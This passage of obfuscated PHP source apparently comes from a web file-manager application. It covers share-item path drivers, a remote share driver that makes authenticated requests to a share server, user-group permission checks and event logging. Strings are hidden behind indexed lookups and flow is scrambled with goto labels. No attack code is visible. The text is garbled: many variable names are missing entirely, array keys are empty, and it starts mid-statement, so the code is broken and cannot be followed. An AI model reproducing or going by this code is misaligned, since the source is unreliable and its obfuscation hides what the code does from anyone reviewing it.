== SourceModel::TYPE_USER && $ͫƎ == $ڰ) { $ = !0; $ե = $ܱ; $ = $; $칄 = $; } else { if ($Ŵً[$ܮ[188]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ͫƎ, $ڰ)) { $ض = !0; $ﶲ̫ = $this->groupStepToUserGroup($ͫƎ, $ڰ); if ($ﶲ̫ < $֪) { $֪ = $ﶲ̫; $ԽҮ = $; $Ũ = $ܱ; $ = $ͫƎ; $ = $; } if ($ﶲ̫ == $֪ && $ >= $ԽҮ) { $ԽҮ = $; $Ũ = $ܱ; $ = $ͫƎ; $ = $; } } else { if (!$ͫƎ || $ͫƎ == $ܮ[228]) { $ʎ = !0; $ = $ܱ; $˾ = $; $ѬЂ = $; } } } } if ($) { $ = $; $ܱ = $ե; $濬 = $칄; $ = LNG($ܮ[2397]); } else { if ($ض) { $ = $ԽҮ; $ܱ = $Ũ; $濬 = $; $ֳ = Model($ܮ[605])->getInfo($); $ = $ܮ[173] . $ֳ[$ܮ[609]] . $ܮ[2398] . LNG($ܮ[2399]); } else { if ($ʎ) { $ = $˾; $ܱ = $; $濬 = $ѬЂ; $ = LNG($ܮ[2378]); } else { $ = 0; $ܱ = !1; $ = $ܮ[12]; $濬 = $ܮ[12]; } } } $ı = array($ܮ[2390] => intval($), $ܮ[2380] => $ܱ, $ܮ[2391] => $, $ܮ[2386] => $濬); return $ı; } private function groupContainUser($Ż, $٫ = false) { return in_array($Ż, $this->userGroupParents($٫)); } private function groupStepToUserGroup($Ɏ, $ = false) { $ݦ螋 =& $_SERVER[]; $Ďԭ = $this->userGroupList($); $؞ = 1000; $ = $GLOBALS[$ݦ螋[6]][$ݦ螋[92]][$ݦ螋[2282]] == 1; $ = $ ? 3 : 2; foreach ($Ďԭ as $͞) { if ($͞[$ݦ螋[1489]] == $Ɏ) { return 0; } $ڲ = explode($ݦ螋[50], trim($͞[$ݦ螋[604]], $ݦ螋[50])); if ($ڲ[0] == $ݦ螋[228] && count($ڲ) > $) { $ͽ = array_reverse(array_slice($ڲ, $)); $ = array_search($Ɏ, $ͽ); if ($ !== !1 && $ + 1 <= $؞) { $؞ = $ + 1; } } } return $؞; } private function userGroupList($ٿ = false, $Đ = false) { $ =& $_SERVER[]; static $ﹴ = array(); if (isset($ﹴ[$ٿ])) { return $ﹴ[$ٿ]; } if (!$Đ) { $Đ = Model($[617])->getInfo($ٿ); } $ﹴ[$ٿ] = array_to_keyvalue($Đ[$[1488]], $[1489]); return $ﹴ[$ٿ]; } public function userGroupParents($Ȏ) { $撌 =& $_SERVER[]; static $ڏ = array(); $Ȏ = $Ȏ ? $Ȏ : USER_ID; if (isset($ڏ[$Ȏ])) { return $ڏ[$Ȏ]; } $ = $this->userGroupList($Ȏ); $֫ = array(); $݆䘪 = $GLOBALS[$撌[6]][$撌[92]][$撌[2282]] == 1; $ = $݆䘪 ? 3 : 2; foreach ($ as $鍾) { $ލ = array($鍾[$撌[1489]]); $ = explode($撌[50], trim($鍾[$撌[604]], $撌[50])); if ($[0] == $撌[228] && count($) > $) { $݈ = array_slice($, $); $ލ = array_merge($ލ, array_reverse($݈)); } $֫ = array_merge($֫, $ލ); } $ڏ[$Ȏ] = array_unique($֫); return $ڏ[$Ȏ]; } public function authTargetInfoMake($Ռ) { $ =& $_SERVER[]; $ʬ = array(); $ϭ = array(); foreach ($Ռ as $ӃǙ) { if ($ӃǙ[$[188]] == SourceModel::TYPE_USER) { $ʬ[] = intval($ӃǙ[$[589]]); } else { if ($ӃǙ[$[188]] == SourceModel::TYPE_GROUP) { $ϭ[] = intval($ӃǙ[$[589]]); } } } if ($ʬ) { $ʬ = Model($[597])->userListInfo($ʬ); } if ($ϭ) { $͕ = array($[2262] => array($[507], $ϭ)); $ϭ = Model($[605])->field($[2400])->where($͕)->select(); $ϭ = array_to_keyvalue($ϭ, $[1489]); } return array($[2401] => $ʬ, $[2402] => $ϭ); } public function authInfo($٧Ж) { $ּ =& $_SERVER[]; if ($٧Ж[$ּ[1634]]) { $ = Model($ּ[591])->listData($٧Ж[$ּ[1634]]); if (!$) { return !1; $ = Model($ּ[591])->listData(); $Ӹ = array_filter_by_field($, $ּ[502], $ּ[228]); return $Ӹ; } $ = array_field_key($, array($ּ[487], $ּ[32], $ּ[502], $ּ[2196], $ּ[2197])); $[$ּ[2403]] = $٧Ж; return $; } else { return array($ּ[508] => 0, $ּ[2181] => $٧Ж[$ּ[2338]], $ּ[509] => $ּ[12], $ּ[2196] => $ּ[2404]); } } } goto aե; AՏЛ: class PathDriverDriverShareItem { public function __construct($쀴Ԁ) { $this->pathParse = $쀴Ԁ; } public function __call($, $) { $ =& $_SERVER[]; if (method_exists($this, $)) { return; } $ = call_user_func_array(array($[1535], $), $); $ՑǪ = array($[1536], $[1537], $[1538], $[1539], $[641], $[643], $[1540], $[107], $[1541], $[1542]); if (in_array($, $ՑǪ)) { $ = $this->getPathOuter($); } return $; } public function copy($ҧ, $, $ = false, $Ħ = false) { return $this->copyMove($ҧ, $, $, $_SERVER[][641], $Ħ); } public function move($ҟ, $, $ٟȦ = false, $۸Ȭ = false) { return $this->copyMove($ҟ, $, $ٟȦ, $_SERVER[][643], $۸Ȭ); } private function copyMove($ǧ, $, $, $Ȝ, $ = false) { $ =& $_SERVER[]; $ƽ = $; $ = IO::driverMake($); if ($->pathParse[$[1331]]) { $ = $->pathParse[$[1331]]; } else { $ = $ƽ; } $ = IO::copyMove($ǧ, $, $, $Ȝ, $); $ = $this->getPathOuter($); return $; } public function pathThis($ײ) { return get_path_this($this->pathParse[$_SERVER[][87]]); } public function pathFather($) { return get_path_father($this->pathParse[$_SERVER[][87]]); } public function iconvSystem($) { return $; } protected function infoParse($ߵ, $ॸ = false) { $ =& $_SERVER[]; $ = $this->pathParse[$[576]][$[583]] . $this->pathParse[$[1350]]; if ($ॸ) { $ՠ = IO::infoWithChildren($); } else { $ՠ = IO::info($); } $ǲ = $this->pathParse[$[576]]; return Action($[1534])->_shareItemeParse($ՠ, $ǲ); } public function listAll($ޕ) { $ʢй =& $_SERVER[]; $ּ = IO::listAll($ޕ); $ = rtrim($this->pathParse[$ʢй[576]][$ʢй[583]], $ʢй[8]); foreach ($ּ as &$밧) { $밧[$ʢй[87]] = $this->pathDriver . $ʢй[8] . ltrim(substr($밧[$ʢй[87]], strlen($)), $ʢй[8]); } unset($밧); return $ּ; } public function listAllSimple($ݣܶ, $ = false) { $ޠ =& $_SERVER[]; $  = $this->listAll($ݣܶ); $ׇ = $this->pathParse[$ޠ[510]]; if (trim($ׇ, $ޠ[8]) == trim(get_path_father($ׇ), $ޠ[8])) { $ = !0; } return IO::init($ޠ[12])->listAllSimpleMake($ , $ׇ, $); } public function getPathOuter($˻) { $Ѱõ =& $_SERVER[]; $ = KodIO::parse($˻); if ($[$Ѱõ[33]] == KodIO::KOD_SHARE_ITEM) { return $[$Ѱõ[87]]; } $ = KodIO::clear($˻); $ݒ = KodIO::clear($this->pathParse[$Ѱõ[576]][$Ѱõ[583]]); $ = substr($, strlen($ݒ)); if (substr($, 0, strlen($ݒ)) != $ݒ) { return !1; } return $this->pathParse[$Ѱõ[1351]] . $Ѱõ[8] . ltrim($, $Ѱõ[8]); } public function getType() { $Ƽ =& $_SERVER[]; $ = str_replace($Ƽ[77], $Ƽ[12], get_class($this)); return strtolower($); } public function isOsDriver($߃) { return IO::isOsDriver($߃); } public function info($) { return $this->infoParse($); } public function infoAuth($Ͳ) { return $this->infoParse($Ͳ); } public function infoWithChildren($) { return $this->infoParse($, !0); } public function infoFull($ݦ೤) { return $this->infoParse($ݦ೤); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($) { $this->pathParse = $; } protected function infoParse($ʱߧ, $ς = false) { $˕ݝ =& $_SERVER[]; return Action($˕ݝ[1357])->sharePathInfo($this->pathParse[$˕ݝ[87]], !0, $ς); } public function listPath($ٌ, $ſ = false) { $򵖥 =& $_SERVER[]; $ŭ = IO::listPath($ٌ, $ſ); if (!$ŭ) { return $ŭ; } if (is_array($ŭ[$򵖥[961]])) { $ = Action($򵖥[1543])->parsePathChildren($ŭ[$򵖥[961]], array($򵖥[510] => $ٌ)); $ŭ[$򵖥[961]] = Action($򵖥[1357])->shareItemInfo($); } foreach ($ŭ as $ => $ʋ) { if (!in_array($, array($򵖥[86], $򵖥[85]))) { continue; } foreach ($ʋ as $Ç텔 => $) { $ = Action($򵖥[1543])->parsePathChildren($, array($򵖥[510] => $ٌ)); $ŭ[$][$Ç텔] = Action($򵖥[1357])->shareItemInfo($); } } return $ŭ; } } class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($) { $А =& $_SERVER[]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $; $ = Model($А[686])->getInfo($[$А[487]]); $ = _get($, $А[580]); $ = Model($А[587])->authMake(_get($, $А[1544])); if (!$) { IO::errorTips(LNG($А[1545]), !1); } if (!$) { IO::errorTips(LNG($А[1546]), !1); } if ($ && is_string($)) { $ = json_decode($, !0); } if (!$ || !$) { return; } $this->_config = array($А[1351] => rtrim($[$А[1351]], $А[8]) . $А[8], $А[1547] => $А[1455] . $[$А[1548]] . $А[499], $А[576] => $, $А[580] => $, $А[1549] => $, $А[1550] => substr(APP_HOST, 0, 8) == $А[217], $А[1551] => Model($А[591])->authCheck($[$А[503]], AuthModel::AUTH_VIEW, !1), $А[1552] => Model($А[591])->authCheck($[$А[503]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($Ӻ) { $ݾ =& $_SERVER[]; $ = $this->_config; if (!$) { return !1; } $ڧ = array($ݾ[1553] => $[$ݾ[1551]], $ݾ[1554] => $[$ݾ[1551]], $ݾ[1379] => $[$ݾ[1551]], $ݾ[107] => $[$ݾ[1552]], $ݾ[1555] => $[$ݾ[1552]], $ݾ[1328] => $[$ݾ[1552]], $ݾ[1556] => !1, $ݾ[429] => !1, $ݾ[1557] => !1, $ݾ[1558] => !1); return $ڧ[$Ӻ]; } public function listPath($Æ, $У = false) { return $this->request($_SERVER[][1559], array($Æ)); } public function setContent($ѭ, $ެ = '') { return $this->request($_SERVER[][1560], array($ѭ, $ެ)); } public function getContent($) { return $this->_fileSubstr($); } public function fileSubstr($̴, $ܬ, $ɿ˛) { return $this->_fileSubstr($̴, $ܬ, $ɿ˛); } public function download($, $) { return $this->_download($, $); } public function isFileOutServer() { return !1; } public function fileOut($, $⭐ = false, $ = false, $ؤ = '') { $̑ =& $_SERVER[]; $this->fileOutLink($this->_fileLink($, ($ؤ ? $̑[1561] . $ؤ : $̑[12]) . ($⭐ ? $̑[1562] : $̑[12]))); } public function fileOutImage($, $ͳ = 250) { $this->fileOutLink($this->_fileLink($, $_SERVER[][1563] . $ͳ)); } public function fileOutLink($Ǧ) { header($_SERVER[][172] . $this->urlAuto($Ǧ)); die; } public function exist($Ǖ) { $· = $this->_info($Ǖ); return $· ? !0 : !1; } public function isFile($۠) { $Ƿ =& $_SERVER[]; $Ώ = $this->_info($۠); return _get($Ώ, $Ƿ[33], $Ƿ[12]) == $Ƿ[230]; } public function isFolder($ح) { $ =& $_SERVER[]; $񕸃 = $this->_info($ح); return _get($񕸃, $[33], $[12]) == $[78]; } public function size($) { $ = $this->_info($); return _get($, $_SERVER[][79], 0); } public function info($Ҧ) { return $this->_info($Ҧ); } public function infoAuth($՜ɽ) { return $this->_info($՜ɽ); } public function infoFull($Ƃ) { return $this->_info($Ƃ); } public function infoFullSimple($ׄ) { return $this->_info($ׄ); } public function infoWithChildren($֑õ) { return $this->_info($֑õ, !0); } public function has($ڥ, $Ř = false, $ = false) { $ =& $_SERVER[]; $٧ = $this->_info($ڥ); if (!$٧) { return !1; } if ($Ř) { return array($[239] => $٧[$[239]], $[240] => $٧[$[240]]); } return $ ? $٧[$[239]] > 0 : $٧[$[240]] > 0; } public function mkfile($Թ, $ϫ = '', $嬦 = REPEAT_RENAME) { return $this->request($_SERVER[][1536], array($Թ, $ϫ, $嬦)); } public function mkdir($, $ = REPEAT_SKIP) { return $this->request($_SERVER[][1537], array($, $)); } public function remove($) { return $this->request($_SERVER[][1328], array($)); } public function rename($, $) { return $this->request($_SERVER[][1540], array($, $)); } public function moveSameAllow() { } public function copy($ԣ, $ՌԤ, $ɹۮ = REPEAT_REPLACE, $ = false) { return $this->request($_SERVER[][641], array($ԣ, $ՌԤ, $ɹۮ)); } public function move($, $蒨, $ = REPEAT_REPLACE, $罰 = false) { return $this->request($_SERVER[][643], array($, $蒨, $)); } public function uploadLink($, $ͻ = 0) { $Ư =& $_SERVER[]; $΁ǃ = IO::init($GLOBALS[$Ư[7]][$Ư[87]]); $ԋ = $this->pathApiEncode($΁ǃ->path); $헓 = $this->requestMakeUrl($Ư[1564], array($Ư[87] => $ԋ)); return array($Ư[1565] => $헓); } public function upload($鑏, $þ, $ = false, $աҥ = REPEAT_REPLACE) { $ =& $_SERVER[]; if (filesize($þ) < $this->uploadChunkSize) { return $this->request($[107], array($鑏, $þ, $աҥ)); } $ӂ = $this->uploadHashCheck($鑏, $þ, $աҥ); if ($ӂ) { return $ӂ; } $ = @filesize($þ); $ٺ = $this->uploadChunkSize; $Ґ = ceil($ / $ٺ); $ = 0; while ($ < $Ґ) { $ = IO::fileSubstr($þ, $ * $ٺ, $ٺ); $ȥ쓇 = $this->tempFile($[12], $); $ᦜ = array($[79] => $, $[1566] => $ٺ, $[1567] => $Ґ, $[1568] => $); $ = $this->uploadSend($鑏, $ȥ쓇, $ᦜ, $աҥ); $++; if (!$) { return !1; } } if (!is_array($) || empty($[$[595]])) { return !1; } return $this->pathApiDecode($[$[595]]); } private function uploadHashCheck($, $ߐ, $) { $ =& $_SERVER[]; $ = IO::hashSimple($ߐ); $ٵ = array($[1569] => $[1570], $[1529] => $); $ = $this->uploadSend($, $[12], $ٵ, $); $Ǥ = _get($, $[595], array()); $ɱ낣 = _get($Ǥ, $[1571]); if (!is_array($ɱ낣) || !$ɱ낣[$[563]]) { return !1; } $Қ = IO::hashMd5($ߐ); if ($ɱ낣[$[563]] != $Қ) { return !1; } if ($[$[595]][$[1572]]) { $this->uploadChunkSize = $[$[595]][$[1572]]; } $ٵ = array($[1569] => $[1573], $[1530] => $Қ, $[1529] => $); $ = $this->uploadSend($, $[12], $ٵ, $); if (!is_array($) || empty($[$[595]])) { return !1; } return $this->pathApiDecode($[$[595]]); } private function uploadSend($ߤþ, $刳ہ, $, $ = '') { $ =& $_SERVER[]; $[$[32]] = get_path_this($ߤþ); $[$[87]] = $this->pathApiEncode(get_path_father($ߤþ)); if ($) { $[$[1574]] = $; } if ($刳ہ) { $[$[230]] = $[1392] . $刳ہ; } return $this->requestSend($[1564], $); } protected function pathApiEncode($) { $ =& $_SERVER[]; $׶ = $this->_config[$[1547]]; $ = strlen($׶); if (substr($, 0, $) == $׶) { return $; } return $׶ . ltrim($, $[8]); } protected function pathApiDecode($) { $窣 =& $_SERVER[]; $Ϫ = $this->_config[$窣[1547]]; $ = strlen($Ϫ); if (substr($, 0, $) !== $Ϫ) { return $; } return $this->_config[$窣[1351]] . ltrim(substr($, $), $窣[8]); } private function pathInfoParse(&$) { $ =& $_SERVER[]; $Ѓ = $this->_config; $۠ = $Ѓ[$[576]]; if (!$ || !is_array($)) { return $; } static $ = array(); $ = $[$۠[$[687]]]; if (!is_array($)) { $ = LNG($[1575]); $ = $Ѓ[$[580]][$[90]]; $ߍ = parse_url($Ѓ[$[580]][$[1576]]); $ŉ˙ = $Ѓ[$[580]][$[1577]]; $ = array($[1578] => $[$[32]] . $[1059] . $ŉ˙ . $[1392] . $ߍ[$[206]] . $[1061], $[1579] => $ . $[1128] . $Ѓ[$[580]][$[1576]] . $[1580] . LNG($[1581]) . $[1128] . $ŉ˙, $[1582] => LNG($[1583]) . $[1584] . $Ѓ[$[580]][$[1576]] . $[285] . LNG($[1585]) . $[1584] . $[$[602]], $[1577] => array($[32] => $ŉ˙, $[1586] => $[1587]), $[1588] => Action($[1534])->shareTargetMake($۠[$[1544]])); $[$۠[$[687]]] = $; } unset($[$[191]]); unset($[$[604]]); unset($[$[188]]); unset($[$[589]]); $[$[1589]] = !0; $[$[232]] = $Ѓ[$[1551]]; $[$[233]] = $Ѓ[$[1552]]; $[$[502]] = $Ѓ[$[1549]]; $[$[1577]] = $[$[1577]]; $[$[1590]] = $۠[$[231]]; $[$[1591]] = $۠[$[88]]; $[$[1592]] = $[$[1582]]; $[$[1588]] = $[$[1588]]; $[$[687]] = $۠[$[687]]; $Ӻ = explode($[8], trim($[$[602]], $[8])); $Ӻ[0] = $[$[1578]]; $[$[602]] = implode($[8], $Ӻ); if (count($Ӻ) > 1) { unset($[$[1588]]); } if (count($Ӻ) == 1) { if ($[$[33]] == $[78]) { $[$[32]] = $[$[1578]]; } array_set_value($, $[1593], $[$[1579]]); } $ϕ = array($[1594], $[1514], $[1595], $[1596]); foreach ($ϕ as $) { $ = $this->urlAuto(_get($, $, $[12])); if ($) { array_set_value($, $, $); } } } private function _info($垡, $쁬 = false) { $ؓއ =& $_SERVER[]; $͇ = $this->_config; if (!$͇) { return !1; } static $ = array(); if (isset($[$垡]) && is_array($[$垡])) { return $[$垡]; } if ((!$垡 || !trim($垡, $ؓއ[8])) && !$쁬) { $Ҹ = $͇[$ؓއ[580]][$ؓއ[90]]; if (!$Ҹ) { return !1; } $Ҹ[$ؓއ[602]] = $ؓއ[12]; $Ҹ[$ؓއ[87]] = $͇[$ؓއ[1351]]; $this->pathInfoParse($Ҹ); return $Ҹ; } $ˉ = $this->request($ؓއ[1597], array($垡, $쁬)); $[$垡] = $ˉ; return $ˉ; } private function _fileSubstr($󔘆, $ = 0, $ = -1) { $ =& $_SERVER[]; $ = $this->_fileLink($󔘆); if (!$) { return !1; } $ݔ = !1; if ($ > 0) { $ߟ = $շ + $ - 1; $ݔ = array($[1598] . $շ . $[476] . $ߟ); } $҇ = url_request($, $[1599], !1, $ݔ); return $҇[$[844]] ? $҇[$[1386]] : !1; } private function _download($ȷ, $Ԡ۹) { $ = $this->_fileLink($ȷ); if (!$) { return !1; } Downloader::start($, $Ԡ۹); return $Ԡ۹; } private function _fileLink($, $۹ = '') { $膽 =& $_SERVER[]; $˫ = $this->pathApiEncode($); return $this->requestMakeUrl($膽[1600], array($膽[87] => $˫)) . $۹; } private function urlAuto($Ψ) { $َ =& $_SERVER[]; if (!$Ψ) { return $Ψ; } $Ғ = parse_url($Ψ); $ʪ = $Ψ; if ($this->_config[$َ[1550]] && $Ғ[$َ[205]] == $َ[149] && Input::check($Ғ[$َ[1601]], $َ[1602])) { $Ψ = $َ[217] . substr($Ψ, 7); } $ = $َ[1603] . rawurlencode(rtrim($this->config[$َ[1547]], $َ[8])); if (strstr($Ψ, $)) { $ឬ = strstr($Ψ, $َ[76]) ? $َ[284] : $َ[76]; $Ψ = $Ψ . $ឬ . $َ[1604] . $this->authToken; } return $Ψ; } private function request($, $א̗) { $ނ =& $_SERVER[]; if (!is_array($א̗)) { $א̗ = array(); } for ($ = 0; $ < 4; $++) { if (!isset($א̗[$])) { $א̗[$] = $ނ[12]; } } $ُ = array($ނ[1597] => array($ނ[1605] => $ނ[1597], $ނ[1606] => $ނ[1607], $ނ[1608] => $ނ[87], $ނ[1350] => array($ނ[1609] => array(array($ނ[87] => $א̗[0])), $ނ[1610] => $א̗[1] ? $ނ[91] : $ނ[12])), $ނ[1559] => array($ނ[1605] => $ނ[1611], $ނ[1606] => $ނ[87], $ނ[1608] => $ނ[1612], $ނ[1350] => array($ނ[87] => $א̗[0], $ނ[428] => _get($GLOBALS[$ނ[7]], $ނ[428], $ނ[91]), $ނ[439] => _get($GLOBALS[$ނ[7]], $ނ[439], $ނ[1613]))), $ނ[1614] => array($ނ[1605] => $ނ[1615], $ނ[1606] => $ނ[87], $ނ[1608] => $ނ[1616], $ނ[1350] => array($ނ[87] => $א̗[0])), $ނ[1560] => array($ނ[1605] => $ނ[1617], $ނ[1606] => $ނ[87], $ނ[1618] => $ނ[1619], $ނ[1350] => array($ނ[87] => $א̗[0], $ނ[168] => $א̗[1])), $ނ[1536] => array($ނ[1605] => $ނ[1536], $ނ[1606] => $ނ[87], $ނ[1618] => $ނ[595], $ނ[1350] => array($ނ[87] => $א̗[0], $ނ[168] => $א̗[1], $ނ[1574] => $א̗[2])), $ނ[1537] => array($ނ[1605] => $ނ[1537], $ނ[1606] => $ނ[87], $ނ[1618] => $ނ[595], $ނ[1350] => array($ނ[87] => $א̗[0], $ނ[1574] => $א̗[2])), $ނ[641] => array($ނ[1605] => $ނ[1620], $ނ[1606] => $ނ[1621], $ނ[1618] => $ނ[1622], $ނ[1350] => array($ނ[1609] => array(array($ނ[87] => $א̗[0])), $ނ[87] => $א̗[1], $ނ[1574] => $א̗[2])), $ނ[643] => array($ނ[1605] => $ނ[1623], $ނ[1606] => $ނ[1621], $ނ[1618] => $ނ[1622], $ނ[1350] => array($ނ[1609] => array(array($ނ[87] => $א̗[0])), $ނ[87] => $א̗[1], $ނ[1574] => $א̗[2])), $ނ[1328] => array($ނ[1605] => $ނ[1624], $ނ[1606] => $ނ[1607], $ނ[1608] => $ނ[87], $ނ[1350] => array($ނ[1609] => array(array($ނ[87] => $א̗[0])))), $ނ[1540] => array($ނ[1605] => $ނ[1625], $ނ[1606] => $ނ[87], $ނ[1618] => $ނ[595], $ނ[1350] => array($ނ[87] => $א̗[0], $ނ[1626] => $א̗[1])), $ނ[107] => array($ނ[1605] => $ނ[1564], $ނ[1606] => $ނ[87], $ނ[1618] => $ނ[595], $ނ[1350] => array($ނ[87] => get_path_father($א̗[0]), $ނ[230] => $א̗[1] ? $ނ[1392] . $א̗[1] : $ނ[12], $ނ[32] => get_path_this($א̗[0]), $ނ[1574] => $א̗[2]))); $Ґ = $ُ[$]; if (!$Ґ) { return !1; } $ = $Ґ[$ނ[1350]]; $Ć = explode($ނ[50], $Ґ[$ނ[1606]]); foreach ($Ć as $ޮ) { $ = $this->pathApiEncode(_get($, $ޮ)); array_set_value($, $ޮ, $); } if ($ == $ނ[1540] && trim($Ґ[$ނ[1350]][$ނ[87]], $ނ[8]) == trim($this->_config[$ނ[1351]], $ނ[8])) { return $Ґ[$ނ[1350]][$ނ[87]]; } $ᦘ = $this->requestSend($Ґ[$ނ[1605]], $); if (!$ᦘ) { return !1; } $ = $ᦘ[$ނ[1386]]; if ($Ґ[$ނ[1618]]) { $ = _get($ᦘ, $Ґ[$ނ[1618]]); } if (is_string($) && !$Ґ[$ނ[1608]]) { return $this->pathApiDecode($); } if (!is_array($) || !$) { return $; } $ = explode($ނ[50], $Ґ[$ނ[1608]]); foreach ($ as $ޮ) { $ܶ = explode($ނ[10], $ޮ); $ = array_search($ނ[1627], $ܶ); if ($ === !1) { $ = $this->pathApiDecode(_get($, $ޮ)); array_set_value($, $ޮ, $); if ($ == $ނ[1597] && $ޮ == $ނ[87]) { $this->pathInfoParse($); } if ($ == $ނ[1559] && $ޮ == $ނ[1628]) { $this->pathInfoParse($[$ނ[961]]); } if ($ == $ނ[1559]) { $[$ނ[1629]] = array(); } continue; } $枽 = implode($ނ[10], array_slice($ܶ, $ + 1)); $ = array(); if ($ === 0) { $ =& $; } if ($ === 1) { $ =& $[$ܶ[0]]; } if ($ === 2) { $ =& $[$ܶ[0]][$ܶ[1]]; } foreach ($ as $ޮ => $) { $ = $this->pathApiDecode(_get($, $枽)); array_set_value($[$ޮ], $枽, $); $this->pathInfoParse($[$ޮ]); } unset($); } return $; } private function requestMakeUrl($К, $ = '') { $ =& $_SERVER[]; $Ŭﾱ = $this->_config; if (!$this->authToken) { return !1; } $ = $this->requestQuery($, !0) . $[1630] . $this->authToken; $欻 = rtrim($Ŭﾱ[$[580]][$[1576]], $[8]) . $[1631] . $К; return $欻 . $[1632] . rawurlencode($Ŭﾱ[$[580]][$[1548]]) . $; } private function requestAuthToken() { $ =& $_SERVER[]; $ = $this->_config; if (!$) { return !1; } $ = _get($, $[1633]); $ = array_find_by_field($[$[580]][$[1588]], $[1634], $); if (!$) { return !1; } $Ɉ = $[$[1635]] . $[1636] . $[$[1341]]; $ = $[1637] . $this->pathParse[$[487]] . $[476] . $Ɉ; $̷ = Cache::get($); if ($̷) { return $̷; } $̷ = Mcrypt::encode($Ɉ, $[1638]); Cache::set($, $̷, 3600 * 24 * 60); return $̷; } private function requestQuery($ = '', $Њɢ = false) { if (!$ || !is_array($)) { return $; } foreach ($ as $☸ => $) { if (is_array($)) { $[$☸] = json_encode($); } } return $Њɢ ? $_SERVER[][284] . http_build_query($) : $; } private function requestSend($̀, $) { $ώ =& $_SERVER[]; $â = $this->requestMakeUrl($̀); if (!$â) { return !1; } $ɲ = url_request($â, $ώ[288], $this->requestQuery($), !1, !1, !0); $Ҹ = $ɲ[$ώ[1386]]; if (!is_array($Ҹ) || !$Ҹ || !$Ҹ[$ώ[1396]] || intval($Ҹ[$ώ[1396]]) > 500) { $ݾ = is_array($Ҹ) ? $Ҹ[$ώ[1386]] : $Ҹ . $ώ[12]; if (!$ɲ[$ώ[844]]) { $ݾ .= $ώ[1639] . $ɲ[$ώ[1396]] . $ώ[175]; } IO::errorTips($ݾ, !1); return !1; } return $Ҹ; } } goto Dϓᵈ; aե: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\162\x63\x65\x5f\x65\x76\145\x6e\x74"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\x54\151\155\145", "\x74\x69\155\x65", "\151\156\163\145\x72\164", "\x66\x75\156\143\x74\151\x6f\156"), array("\144\x65\x73\143", '', "\x69\x6e\x73\x65\162\x74\54\165\x70\144\x61\x74\x65\54\163\145\154\x65\x63\164", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($󑫷, $뙉, $ߐ = '') { $ʣ =& $_SERVER[]; if (!$this->eventSave) { return; } $ = Model($ʣ[1527])->sourceInfo($󑫷); if (!$) { return !1; } if ($this->isDisableEvent($, $뙉)) { return; } if ($ߐ && is_string($ߐ)) { $ߐ = array($ʣ[2215] => $ߐ); } $ϼ = KodUser::id(); $ظ = array($ʣ[506] => $󑫷, $ʣ[2405] => $[$ʣ[190]], $ʣ[2406] => $[$ʣ[32]], $ʣ[602] => !empty($[$ʣ[602]]) ? $[$ʣ[602]] : $ʣ[12], $ʣ[1961] => $ϼ, $ʣ[511] => $뙉, $ʣ[1963] => $ߐ); $this->addSystemLog($뙉, $ظ); unset($ظ[$ʣ[2406]], $ظ[$ʣ[602]]); return $this->add($ظ); } private function addSystemLog($ª, $µ) { $ =& $_SERVER[]; if ($ª == $[2407]) { $ª = $µ[$[540]][$[2408]]; } else { if (in_array($ª, array($[1556], $[2409]))) { $ª = $µ[$[540]][$[168]]; } } $ = array_merge($µ, array($[2410] => $µ[$[191]], $[2411] => $µ[$[2411]])); Hook::trigger($[2412], $[2413] . $ª, $µ); Model($[2122])->addLog($[2413] . $ª, $); } private function isDisableEvent($, $ר) { $Ε =& $_SERVER[]; if ($[$Ε[188]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ר == $Ε[1328]) { return !1; } return !0; } public function eventCreate($Ǩ, $) { $˱Ů =& $_SERVER[]; $Ҷ = Model($˱Ů[1527])->sourceInfo($Ǩ); $ = array($˱Ů[2408] => $, $˱Ů[32] => $Ҷ[$˱Ů[32]]); return $this->addEvent($Ǩ, $˱Ů[2407], $); } public function eventFileEdit($Ƅ) { $̿ =& $_SERVER[]; $ = array($̿[2414] => $_SERVER[$̿[2415]], $̿[2416] => strtolower(ACTION)); if (isset($GLOBALS[$̿[7]][$̿[1617]])) { $[$̿[1617]] = $̿[91]; } return $this->addEvent($Ƅ, $̿[1555], $); } public function eventRecycle($, $) { return $this->addEvent($, $_SERVER[][2409], $); } private static $_removeLast = ''; public function eventRemove($) { $˯ =& $_SERVER[]; self::$_removeLast = $; $ = Model($˯[1527])->sourceInfo($); $ے = array_field_key($, array($˯[191], $˯[557], $˯[520], $˯[604])); $ = array($˯[168] => $[$˯[32]], $˯[2416] => ACTION, $˯[2417] => $ے); return $this->addEvent($[$˯[190]], $˯[1328], $); } public function eventShare($, $) { return $this->addEvent($, $_SERVER[][1556], $); } public function eventMove($, $, $ٰ) { $ =& $_SERVER[]; if (self::$_removeLast == $) { return; } $ž = Model($[1527]); $ = $ž->sourceInfo($); $⤟ = $ž->sourceInfo($); $ = $ž->sourceInfo($ٰ); $򈕒 = array($[1340] => $, $[2418] => $⤟[$[32]], $[2376] => !empty($⤟[$[602]]) ? $⤟[$[602]] : $[12], $[1341] => $ٰ, $[2419] => $[$[32]], $[2420] => !empty($[$[602]]) ? $[$[602]] : $[12]); $this->addEvent($, $[643], $򈕒); $ = $ž->sourceInfo($); $򈕒 = array($[191] => $[$[191]], $[32] => $[$[32]]); $this->addEvent($, $[2421], $򈕒); } public function eventCopy($) { $this->eventCreate($, $_SERVER[][641]); } public function eventRename($Ը, $ղ, $ǚϝ) { $ݝ =& $_SERVER[]; $Ҫ = array($ݝ[1340] => $ղ, $ݝ[1341] => $ǚϝ); return $this->addEvent($Ը, $ݝ[1540], $Ҫ); } public function eventAddComment($, $𦦑) { return $this->addEvent($, $_SERVER[][2422], $𦦑); } public function eventAddDesc($ߖ, $Ӈ) { return $this->addEvent($ߖ, $_SERVER[][2423], $Ӈ); } public function listBySource($鍥) { $Ǟ =& $_SERVER[]; $ = Model($Ǟ[1527])->sourceInfo($鍥); $Ȩɐ = array($Ǟ[506] => $鍥); if ($[$Ǟ[500]] == $Ǟ[91]) { $ = 20000; $벿 = array($Ǟ[604] => array($Ǟ[473], $[$Ǟ[604]] . 